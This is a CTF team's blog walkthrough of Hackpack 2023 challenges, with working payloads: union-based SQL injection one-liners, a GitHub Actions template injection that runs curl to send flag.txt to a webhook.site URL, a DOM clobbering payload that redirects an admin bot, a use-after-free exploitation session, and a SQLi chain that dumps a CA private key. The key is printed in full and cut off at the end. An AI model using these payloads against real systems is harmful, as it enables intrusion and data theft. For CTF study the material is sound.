---
layout: post
title:  "Hackpack 2023 - Jeopardy CTF Walkthrough"
date:   2023-04-16 12:28:05 +0100
categories: writeups
---

CTFtime url of this event: [here](https://ctftime.org/event/1893)

Our final placement was 14th out of 381 teams.

In this post, we provide solutions for all the challenges we have solved. The mentioned `Author` is not the author of the challenge, but the teammate who solved it.

# Cat Me if You Can

```
Author: Daloski
Description: Restricted shell escape
Category: Misc
Points: 100
Solves: 197
```

## Description
There's a flag hiding in plain sight, Our cat has been trying to get it for a while now, but it keeps escaping him at the last moment. Can you help him out?

## Payload
`pr *`, then profit.

# WolfHowl

```
Author: 0xDark
Description: Union-based SQL injection
Category: Web
Points: 100
Solves: 114
```

## Description
Log into WolfHowl to get the flag

wolfhowl.cha.hackpack.club

## Payload (one-liner)
`curl -s https://wolfhowl.cha.hackpack.club/ --data 'artist=" union select concat(email,":",password),2,3,4 from employee limit 50-- -' | grep -Po 'Artist: .+?<\/p>'`

# issue-tracker

```
Author: LL3006
Description: Template injection in Github Actions
Category: Web
Points: 100
Solves: 94
```

## Description
Do you want to know the secret? If yes, post an issue here: https://github.com/hackpackctf/issue-tracker?

## Solution
By looking at the implemented Github Action, it's possible to note that it's possible to inject code using the template engine of the issues.

The payload is injected in the issue body, like this:

{% raw %}
```
{{ code here }}
```
{% endraw %}

The injected code is NodeJS, and the flag is in `flag.txt`, so it's possible to craft a payload like this:

{% raw %}
```
{{ process.mainModule.require("child_process").exec("curl --data-binary '@./flag.txt' https://webhook.site/<webhook_url>") }}
```
{% endraw %}

# Speed-Rev: Humans

```
Authors: Shotokhan & Dralute
Description: Fast reversing of mutating binaries
Category: Reverse
Points: 100
Solves: 69
```

## Description
Welcome to the Speed-Rev battle for humans! Connect to the socket! Recive binaries! AND GET! THE! FLAGS!

(There are 5 levels total, 30 minutes until you timeout) Author: Sturmh0nd#1337
nc cha.hackpack.club 41709

## Analysis
We interact with the service and we get the first binary, base64-encoded.
We decode it and analyze it.

```
$ file rev_example_0.bin 
rev_example_0.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c6c069720972795392822221ae01b4953c899395, not stripped
```

The general idea is that we have to understand how to reverse this one, then all the others will be mutation of this one so we will have to automate the analysis with respect to possible mutations.

We quickly learn that there is a `validate` function and that the return code of the binary is the output of this function. This function just compares the input with a hard-coded string.

The binary analysis can then be automated by looking at the value of the global string holding the correct value to give to the binary. In this challenge, the speed rev is for "humans" because it's trivial to leak the string using `ltrace`:

```
$ ltrace ./rev_example_0.bin 
calloc(17, 1)                                                                                           = 0x5562f37062a0
__isoc99_fscanf(0x7fed5117e800, 0x5562f2260015, 0x5562f37062a0, 0x5562f37062b0asd
)                         = 1
strncmp("asd", "ovMBnPFwPAbTRl6f", 16)                                                                  = -14
+++ exited (status 1) +++
$ ./rev_example_0.bin 
ovMBnPFwPAbTRl6f
$ echo $?
0

```

So it's possible to solve this challenge without automating the interaction.

That was the hypothesis, but after submitting the string, we were given a different kind of binary.
Two in a row with array of characters to just combine (example):
- HXUH2ipzsitnRm63
- DWHhEntwRuq57aYp

The fourth was a linear system of equations of the form:
- 1 1 0 ..   0 = b0
- 0 1 1 0 .. 0 = b1
- ..
- 0 ..   0 1 1 = bN

So there is one missing equation, i.e., it is possible to arbitrarily set the first character.

The fifth and the sixth are like the fourth one, but only for a subset of the characters: the others are fixed.

The server filters characters, probably it allows only ASCII letters and digits, and the length must always be 16.

We developed a script to solve the linear system of equations, handling the case of some fixed characters (`pad`), and by inserting the coefficients and the fixed characters in the script by hand:

{% highlight python %}
import string
import random


def main():
    alphabet = string.ascii_letters + string.digits
    # l = [0xdd, 0xca, 0xc4, 0xe2, 0xe3, 0xad, 0xa4, 0xb1, 0xbf, 0xc6, 0x8f, 0xa5, 0xa0, 0x77, 0x9c]
    l = [0xe8, 0xa6, 0xac, 0xee, 0xec, 0xd8, 0xb1, 0xb6, 0xac, 0x99, 0x8a, 0xae]
    additional_cond = lambda m: m.endswith('x')
    for ch in alphabet:
        x = [ord(ch)]
        i = 0
        while i < len(l):
            val = x[i]
            b_i = l[i]
            new_val = b_i - val
            x.append(new_val)
            i += 1
        m = "".join([chr(c) for c in list(x)])
        if all([c in alphabet for c in m]) and additional_cond(m):
            print("Found")
            break
    pad = "Vi"
    m += pad
    m += "A" * (16 - len(m))
    print(m)


if __name__ == "__main__":
    main()

{% endhighlight %}

Flag: `flag{Human_or_r0b0t_1dk}`.

# Number Store

```
Author: Shotokhan
Description: Heappy menu with Use-After-Free on a PIE executable, with win function
Category: Pwn
Points: 116
Solves: 48
```

## Description
Welcome to Number Store(TM)! A new FREE password manager. However, due to budget constraints we were only able to add support for storing numbers. Store your favorite secret numbers or generate new random ones! Also comes with a super secret flag!
nc cha.hackpack.club 41705

## Analysis
```
$ file chal
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cf74f926f56cc8436ca31c4657fe6b1c3bf71930, not stripped
```

```
$ checksec chal
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The prompt is the following:
```
$ ./chal
WELCOME TO NUMBER STORE
Store your favorite or secret numbers here! You can even generate new random numbers!
Now includes a super secret flag!

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

```

The list is handled like an array with random access (even if printed like a linked list), and the binary overall behaves like a heappy menu. If you try to edit or show uninitialized entries, you immediately get segmentation fault.

The "show super secret flag" endpoint only prints "access denied", but in the binary there is a `printFlag` win function.

The "store new number" endpoint is based on a function named `createStaticNum`, that basically malloc a 24-bytes object (let's call it `static_number`), of which the first 16 are for the name and the other 8 are for the number. The name and the number are read using the function `getName` and `getUserNum`. The `getName` function performs some strange validation on the input, for now we only have to keep in mind that the name is somewhat constrained.

There are managed two lists: one with the references to the allocated objects, another containing only the names of the objects (but not as pointers to the objects: they contain them by copy).

Endpoints 1-4 perform bounds checking on the index on which the object must be stored/deleted/edited/showed, i.e, the index can only be from 0 to 9.

The "delete number" endpoint frees the object but doesn't null the reference (it only resets the name in the "names list"), so it's trivial to perform use-after-free on any object: `store -> delete -> edit/show`.

The random number generation has a particular handling:
- if no random number has been generated before, it calls a function `createRandomNum` that malloc a 24-bytes object (let's call it `rand_handler`), organized like that (in groups of 8 bytes):
```
| Random number (init to 0) | Previous random number (init to 0) | Pointer to `generateRandNum` function |
```
- the generated object `rand_handler` is then used: the function pointer (third field) is called to generate a random number, the second field is set equal to the first field, and the first field is set equal to the generated random number;
- at this point, the `rand_handler` is not null, so it's also possible to call the endpoint to show the random number.

Let's compare the structure of the `rand_handler` object with the structure of the `static_number` object:
```
| Random number (init to 0) | Previous random number (init to 0) | Pointer to `generateRandNum` function |
|                         Name                                   |              Number                   |
```

## Exploitation
TLDR ([UAF + malloc first-fit behaviour](https://infosecwriteups.com/use-after-free-13544be5a921)):
- `store(index=0, name='', num=0)`;
- `delete(index=0)`;
- `generate_rand()`;
- `pie_leak = show(index=0)`;
- `edit(index=0, num=print_flag_addr)`;
- `generate_rand()`.

I wrote a script for that, but at last I solve it by interacting by hand, because the functions used to get input gave me some problems. From `pie_leak`, that is `generateRandNum`, to `print_flag_addr`, that is `printFlag`, you just have to subtract 19 to the number obtained with `show` and use the result in `edit`.

```
$ nc cha.hackpack.club 41705
WELCOME TO NUMBER STORE
Store your favorite or secret numbers here! You can even generate new random numbers!
Now includes a super secret flag!

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

Choose option: 1
Enter index of new number (0-9): 0
Enter object name: asd
Enter number: 0

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

Choose option: 2
Enter index of number to delete (0-9): 0

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

Choose option: 6
1804289383

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

Choose option: 4
Select index of number to print (0-9): 0
<some bad bytes>
94422048014935

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

Choose option: 3
Enter index of number to edit (0-9): 0
Enter new number: 94422048014916

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

Choose option: 6
flag{n3v3r_tru5t_fr33_jVmVsEuj}
0

1.) Store New Number
2.) Delete Number
3.) Edit Number
4.) Show Number
5.) Show Number List
6.) Generate Random Number
7.) Show Random Number
8.) Show Super Secret Flag
9.) Quit

Choose option: 9

```

# Speed-Rev: Bots

```
Authors: Shotokhan & Dralute
Description: Automated reversing of mutating binaries
Category: Reverse
Points: 205
Solves: 41
```

## Description
Welcome to the Speed-Rev battle for your bots! Connect to the socket! Recive binaries! AND GET! THE! FLAGS!

(There are 6 levels total, you have 3 minutes to complete them all) Author: Sturmh0nd#1337
nc cha.hackpack.club 41702

## Solution
Binaries look like the same of "Speed-Rev: Humans", the difference is that now the analysis must be automated.

We used offsets in the binary for the first three levels, then regex on instruction opcodes for the last levels to get the values (such as the immediate character values or the coefficients of the linear system of equations).

In particular, for the last two levels, we used regexes also to differentiate between the immediate value of a character and the sum between two characters. Then, we used the values as constraints for the `z3` solver.

More specifically, in the fourth binary the compare instructions in the `validate` function are in one of the two following forms:
- `3d <byte> 00 00 00`;
- `83 f3 <byte>`.

Therefore, it's easy to have a regex that implements a logical OR and then differentiate the two cases to get the `byte`, which will be a coefficient of the linear system. The regex is `(\x3d.\x00\x00\x00|\x83\xf8.)`.

In the fifth and sixth binaries, there are two cases:
- immediate value of a character, always implemented by comparing `AL` instead of `EAX` (the fourth binary used `EAX`), so the instruction bytes are of the form `3c <byte>`;
- sum between two characters, that always have `ADD EAX, EDX` followed by a compare, and the form is always `01 d0` for the `ADD`, while it can be `3d <byte> 00 00 00` or `83 f8 <byte>` for the compare (slightly different from the fourth binary).

The regex for these last two binaries is therefore `(\x01\xd0\x3d.\x00\x00\x00|\x01\xd0\x83\xf8.|\x3c.)`: by including the `ADD` in the regex, we are sure that the first two cases of the logical OR are related to the sum of two characters.

You can look at the script here:

{% highlight python %}
from pwn import *
import string
import re
from z3 import *
import base64


PASS_LEN = 16


def pass_first_binary(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    offset = 8196
    pwd = data[offset:offset+PASS_LEN]
    return pwd


def pass_second_and_third_binary(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    validate_func_addr = 4421
    validate_func_len = 392
    offsets = [0xf, 0x28, 0x41, 0x5a, 0x73, 0x8c, 0xa5, 0xbe, 0xd7, 0xf0, 0x109, 0x11f, 0x135, 0x14b, 0x161, 0x177]
    offsets = [off + 1 for off in offsets]
    validate_func = data[validate_func_addr:validate_func_addr+validate_func_len]
    pwd = "".join([chr(validate_func[off]) for off in offsets])
    return pwd


def pass_fourth_binary(filename):
    alphabet = string.ascii_letters + string.digits
    with open(filename, 'rb') as f:
        data = f.read()
    validate_func_addr = 4421
    validate_func_len = 750
    validate_func = data[validate_func_addr:validate_func_addr+validate_func_len]
    pat = b'(\x3d.\x00\x00\x00|\x83\xf8.)'
    cmp_list = re.findall(pat, validate_func)
    get_val = lambda cmp: cmp[1] if cmp.startswith(b'\x3d') else cmp[2]
    B = [get_val(cmp) for cmp in cmp_list]
    for ch in alphabet:
        x = [ord(ch)]
        i = 0
        while i < len(B):
            val = x[i]
            b_i = B[i]
            new_val = b_i - val
            x.append(new_val)
            i += 1
        m = "".join([chr(c) for c in list(x)])
        if all([c in alphabet for c in m]):
            break
    pwd = m
    return pwd


def pass_fifth_and_six_binary(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    validate_func_addr = 4421
    validate_func_len = 800
    validate_func = data[validate_func_addr:validate_func_addr+validate_func_len]
    pat = b'(\x01\xd0\x3d.\x00\x00\x00|\x01\xd0\x83\xf8.|\x3c.)'
    cmp_list = re.findall(pat, validate_func)
    A = [Int(f'a_{i}') for i in range(PASS_LEN)]
    S = Solver()
    for a in A:
        digit = And(ord('0') <= a, a <= ord('9'))
        uppercase = And(ord('A') <= a, a <= ord('Z'))
        lowercase = And(ord('a') <= a, a <= ord('z'))
        in_alphabet = Or(digit, uppercase, lowercase)
        S.add(in_alphabet)
    i = 0
    for cmp in cmp_list:
        if cmp.startswith(b'\x3c'):
            val = cmp[1]
            S.add(A[i] == val)
        else:
            cmp = cmp[2:]
            if cmp.startswith(b'\x3d'):
                val = cmp[1]
            else:
                val = cmp[2]
            S.add(A[i] + A[i+1] == val)
        i += 1
    is_sat = S.check()
    if is_sat.r <= 0:
        print("Error: unsat conditions")
        exit(1)
    model = S.model()
    pwd = "".join([chr(model[a].as_long()) for a in A])
    pwd += "A" * (PASS_LEN - len(pwd))
    return pwd


def recv_binary(r, binary_pat, outfile):
    data = r.recvrepeat(3).decode()
    matches = re.findall(binary_pat, data)
    b64_bin = matches[0][2:-1]
    binary = base64.b64decode(b64_bin)
    with open(outfile, 'wb') as f:
        f.write(binary)


def main():
    r = remote('cha.hackpack.club', 41702)
    binary_pat = re.compile("b'[A-Za-z0-9+/=]+'")
    outfile = "/tmp/binary"
    
    recv_binary(r, binary_pat, outfile)
    pwd = pass_first_binary(outfile)
    r.sendline(pwd)

    recv_binary(r, binary_pat, outfile)
    pwd = pass_second_and_third_binary(outfile)
    r.sendline(pwd)

    recv_binary(r, binary_pat, outfile)
    pwd = pass_second_and_third_binary(outfile)
    r.sendline(pwd)

    recv_binary(r, binary_pat, outfile)
    pwd = pass_fourth_binary(outfile)
    r.sendline(pwd)

    recv_binary(r, binary_pat, outfile)
    pwd = pass_fifth_and_six_binary(outfile)
    r.sendline(pwd)

    recv_binary(r, binary_pat, outfile)
    pwd = pass_fifth_and_six_binary(outfile)
    r.sendline(pwd)

    r.interactive()   


if __name__ == "__main__":
    main()

{% endhighlight %}

```
$ python script.py 
[+] Opening connection to cha.hackpack.club on port 41702: Done
[*] Switching to interactive mode
Congrats! Here is your flag!
flag{speedruns_are_aw3s0m3_4nd_4ll}
[*] Got EOF while reading in interactive
$ 
```

# HackerChat

```
Author: Tiugi
Description: SQL injection to leak key to break authentication
Category: Web
Points: 304
Solves: 24
```

## Description
HackerChat is the hottest new chat app for hackers. Can you recover the secret message sent to the HackerChat admin?

## Solution (TLDR)
There is a search API, which is vulnerable to SQL injection. By performing the SQLi, it's possible to leak the key used to sign access tokens (JWT), then it's possible to authenticate as admin, getting access to the flag.

# Wiki world

```
Author: 0xDark
Description: Pastebin vulnerable to DOM Clobbering
Category: Web
Points: 416
Solves: 21
```

## Description
Can you alpha test out our newest note-taking website? (If you find anything, please report it to us using nc cha.hackpack.club 8702)

Also unrelatedly, our website admin is really fond of the wiki-world extension, he uses it all the time, even on his work computer.

I should probably get him to stop using it tho, it hasn't been approved by IT yet.

## Writeup

The web app is a pastebin.

It's possible to report URLs, which are then visited using `Puppeteer`. The bot is configured such to load a custom extension.

The extension look in the page some text according to a regex called `WIKI_REGEX`, and then performs search on Wikipedia, whose URL is defined by a variable called `WIKIPEDIA_SERVER`.

These variables are accessed through `window.config.*`, then we can overwrite them using a technique called [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering).

Note that the flag is inserted in the path of the request to Wikipedia generated by the `Puppeteer` extension, so if we manage to force the bot to make a request to an attacker-controlled endpoint instead of Wikipedia, we will get the flag.

The payload that we use in our note is:

{% highlight html %}
<a id=config><a id=config name=WIKIPEDIA_SERVER href="https://webhook.site/">
<a id=config><a id=config name=WIKI_REGEX href="BLOB:(.*)">
{% endhighlight %}

We use this form, with the tags `a` and `BLOB`, because they are in the whitelist of `DOMPurify`.

So the final payload, i.e., the URL to report to admin, is:
> `http://website:5000/#PGEgaWQ9Y29uZmlnPjxhIGlkPWNvbmZpZyBuYW1lPVdJS0lQRURJQV9TRVJWRVIgaHJlZj0iaHR0cHM6Ly93ZWJob29rLnNpdGUvIj4KPGEgaWQ9Y29uZmlnPjxhIGlkPWNvbmZpZyBuYW1lPVdJS0lfUkVHRVggaHJlZj0iQkxPQjooLiopIj4=`

# MasterShackle

```
Author: LL3006
Description: "Certification Authority"-like website with multiple vulnerabilities, leading to broken authentication and private key leak
Category: Web
Points: 493
Solves: 8
```

## Description
Hello everyone, this is the Shackle Breaking Barrister!

As I've covered in many of my MeTube videos, you'll know that MasterShackle locks are among the worst I've ever featured on my channel. Unfortunately, they've redesigned their website and are now calling it 'impregnable', and security level '11'.

While I am very good at picking locks, I heard you are very good at hacking into websites, so I was hoping you could help me show that they are just as bad at web security as they are at physical security!

As always, thanks for watching, and if you have any questions or comments, please feel free to reach out!
mastershackle.cha.hackpack.club

## Writeup

### Step 1. Index
First step is to open up [mastershackle.cha.hackpack.club](https://mastershackle.cha.hackpack.club/). From the headers we find it's a PHP website. We can see that the main page is very simple but has 3 interesting things.

The [`/flag`](https://mastershackle.cha.hackpack.club/flag) endpoint. Here where we find the first mention of the "MaserCrypt" system and the final objective of the challenge, that is to **sign an arbitrary payload and provide a valid certificate**.  

The "[`/crypto4kidz`](https://mastershackle.cha.hackpack.club/crypto4kidz)" endpoint. This is a static page with a few caesar ciphers. 

The [`/testimonials?path=testimonials.json`](https://mastershackle.cha.hackpack.club/testimonials?path=testimonials.json) endpoint. This loads the data for the "glowing recommendations" on the bottom of the page.


### Step 2. `/crypto4kidz`
The ciphers present on the page decode to

```
THE FLAG IS FLAG OPEN SQUARE BRACES DLFIEGJIWNGIIEGI CLOSE SQUARE BRACE
HA MADE YOU LOOK
ALWAYS USE A LOCK TO SECURE YOUR VALUABLES
A WISE MAN USES THE MASTERSHACKLE ONE PIN MODEL TO SECURE THE ARMORY
THE URL FOR THE CA IS AT MASTERSHACKLE DOT CHA DOT HACKPACK DOT CLUB SLASH MASTERCRYPT
```

The only relevant one is the last message, which hints us at a [/mastercrypt](https://mastershackle.cha.hackpack.club/mastercrypt) endpoint.

### Step 3. `/testimonials`
At a first glance this seems like simple path traversal but it just defaults to `testimonials.json` most of the time.  

Except when we break it. Enter the **laravel debug page**.

We first discovered this by passing an array as the path (`/testimonials?path[]=`). As it turns out, this website is a laravel app with `APP_DEBUG=true` so we can use the nicely rendered error pages to **read the source code** surrounding the error. 

From the `/testimonials?path[]=` error page we notice that while a full path traversal is impossible, we can generate another error in the `file_get_contents` call if the path is a directory. This is simple as navigating to `/testimonials?path=.`.

In the source code leaked from this page, we can find a very interesting function

{% highlight php %}
    public function cmdInjection(Request $request) {

        $tpath = "../resources/";

        $tpath = public_path($tpath);

        $cmdOutput = system('ls -al ' . resource_path());

        die($cmdOutput);

    }
{% endhighlight %}

This lists files from the `resources` folder (which is the only one accessible through the `/testimonials` endpoint).

After ~~four hours~~ and a few guesses, we found the correct endpoint for the function to be `/cmd`. 

This returns 

```
total 32 
drwxrwxr-x 7 sail sail 4096 Apr 14 04:50 . 
drwxrwxr-x 13 sail sail 4096 Apr 14 21:56 .. 
drwxrwxr-x 6 sail sail 4096 Apr 14 04:50 ca 
-rw-rw-r-- 1 sail sail 32 Apr 14 04:50 ca.token 
drwxrwxr-x 2 sail sail 4096 Apr 14 04:50 css 
drwxrwxr-x 2 sail sail 4096 Apr 14 04:50 js 
drwxrwxr-x 2 sail sail 4096 Apr 14 04:50 testimonials 
drwxrwxr-x 2 sail sail 4096 Apr 14 21:56 views 
drwxrwxr-x 2 sail sail 4096 Apr 14 21:56 views
```

`ca.token` looks interesting, and we can get it with  `/testimonials?path=../ca.token`.

```
a0c6d51083a505ff45ad8d12c42bcb04
```

### Step 4. `/mastercrypt` (redirect)

Remember the `/mastercrypt` endpoint from the last cipher? At a first glance it looks like a redirect to the main page but upon closer inspection of the redirect headers we find
 
```
$ curl --head https://mastershackle.cha.hackpack.club/mastercrypt

HTTP/2 302 
cache-control: no-cache, private
content-type: text/html; charset=UTF-8
date: Sat, 15 Apr 2023 16:07:49 GMT
date: Sat, 15 Apr 2023 16:07:49 GMT
errormessage: No cookie named token was passed, or the value was not correct!
host: mastershackle.cha.hackpack.club
[...]
```

So a cookie named `token` is needed. And we just happen to have already found its value to be `a0c6d51083a505ff45ad8d12c42bcb04`. After setting the cookie, we can navigate to the real `/mastercrypt` page.


### Step 5. `/mastercrypt` (login)

We have no credentials but we already know the trick: `name=password[]` instead of `name=password` in the `/login` form gives us another information-dense error page to look at.

{% highlight php %}
    public function login(Request $request): mixed {

        if (!$request->input("username")) {

            return view('mastercrypt_login', ['error' => "No username passed in!"]);

        }

        if (!$request->input("password")) {

            return view('mastercrypt_login', ['error' => "No password passed in!"]);

        }



        $username = $request->input("username");

        $password = $request->input("password");

        try {

            if (str_contains($username, ";")) {

                return view('mastercrypt_login', ['error' => "Validation error!"]);

            }

            if (str_contains($password, ";")) {

                return view('mastercrypt_login', ['error' => "Validation error!"]);

            }

            if (str_contains($password, "UNION")) {

                return view('mastercrypt_login', ['error' => "Validation error!"]);

            }

            if (str_contains($password, "UNION")) {

                return view('mastercrypt_login', ['error' => "Validation error!"]);

            }

            $selStmt = '`password`="' . $password . '"';

            $sel2Stmt = '`username`="' . $username . '"';

            $users = User::select('*')

                ->whereRaw($sel2Stmt)

                ->whereRaw($selStmt)

                ->get();
        }
    }
{% endhighlight %}

This is just a simple SQLi, and setting `" OR "1"="1` as both username and password dumps all the users. 

Then we can choose log as say, `f21f1d8` by setting
 
`username`

```
f21f1d8
```

and

`password` 

```
" OR  `username`  = "f21f1d8  
```

and voilà, we're logged in.

### Step 6. `/mastercrypt` (exploration)

Now that we are logged in, we can look around the page and explore the functions that aren't disabled. 

From `/mastercrypt/listCAs` we find that there are 3 CAs, and we're obviously intrested in the 3rd, `MasterShackle Flag SubCA`.

In `/mastercrypt/CADetails` we can list all the users in a CA. While the `<select>` tag only has the one we're part of, by changing the option value to `3` we can find the users in the `MasterShackle Flag SubCA`. Turns out to be only `6f9fa47`.

In `/mastercrypt/issuecert` we can issue certificates for our `SubCAs` given a Certificate Signing Request (`CSR`). While we can generate one with openssl we must use the  `MasterShackle Flag SubCA` private key in order for it to work ~~trust me I've tried~~.

Then we have `/mastercrypt/sign` which just signes arbitrary data. But, even here, we still need a key...

### Step 7. `/mastercrypt` (WhEre KeY?)

The key endpoints are all disabled but we can recover the private keys with some more SQL injections in the `/mastercrypt/login` page.

As long as there is more than one user, the page dumps all the collection. We can abuse this behaviour by setting `username` to garbage and `password` to
```
" OR `id`=1 UNiON SELECT 0,1,2,3,4 WHERE "1"="1
```

The fourth field is the user password and is not shown, while the field that's interpreted as a string is 1, which corresponds to the username.

(The casing in the `UNION` keyword is used to bypass the filter.)

By querying `information_schema.tables` we can get a list of tables and then we can list the columns with `information_schema.columns`.

Eventually we end up with a query that looks like this
```
" OR `id`=1 UNiON SELECT `id`,`private_key`,NULL,NULL,NULL FROM CA WHERE "1"="1
```

And we can dump the private keys from all the CAs. 

We're particularly intrested in the 3rd one, which (formatted) is

```
-----BEGIN PRIVATE KEY-----
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
